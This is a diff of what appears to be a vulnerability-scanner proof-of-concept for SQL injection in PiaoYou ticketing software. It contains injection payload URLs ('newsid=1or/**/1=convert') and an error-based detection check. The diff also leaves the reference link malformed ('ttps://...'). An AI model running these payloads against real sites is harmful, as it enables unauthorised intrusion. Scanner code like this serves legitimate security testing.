@@ -17,7 +17,7 @@ class Vuln(ABVuln):
         newslist.aspx?newsid=1or/**/1=convert
         news_view.aspx?id=1or/**/1=convert
     '''  # 漏洞描述
-    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0128207
+    ref = 'ttps://bugs.shuimugan.com/bug/view?bug_no=0128207'  # 漏洞来源h
     cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
     product = 'PiaoYou(票友软件)'  # 漏洞应用名称
@@ -59,8 +59,8 @@ class Poc(ABPoc):
                 url = arg+p
                 code, head, res, errcode, _ = hh.http(url)
                 if code == 500 and "GAOJIMicrosoft" in res:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
+                        target=self.target, name=self.vuln.name, url=url))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
